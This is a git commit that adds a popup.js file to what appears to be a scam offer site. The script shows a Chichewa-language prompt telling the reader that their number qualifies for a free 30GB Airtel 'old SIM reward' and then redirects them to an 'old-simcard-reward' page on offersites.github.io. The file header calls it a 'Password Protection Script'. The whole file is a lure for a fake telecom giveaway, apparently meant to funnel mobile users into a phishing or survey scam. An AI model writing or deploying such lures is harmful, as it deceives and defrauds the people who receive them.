8c2e01c3e6e07c53f079dd6b7cac12e06bc9e521
offersites <havast1920@gmail.com>
2024-10-22 01:16:34 +0100

    Create popup.js

---
+++ popup.js
@@ -0,0 +1,6 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = '30GB Free Data'
+password=prompt('SMS:Nambala Yanu Ndi Yoyenera Kulandila 30GB Yaulere AIRTEL OLD SIM REWARD, Dinani Chabwino kuti muyambitse ','30GB Data Yaulere');
+if (password != '30GB Free Data') {
+location.href='https://offersites.github.io/old-simcard-reward';
+}
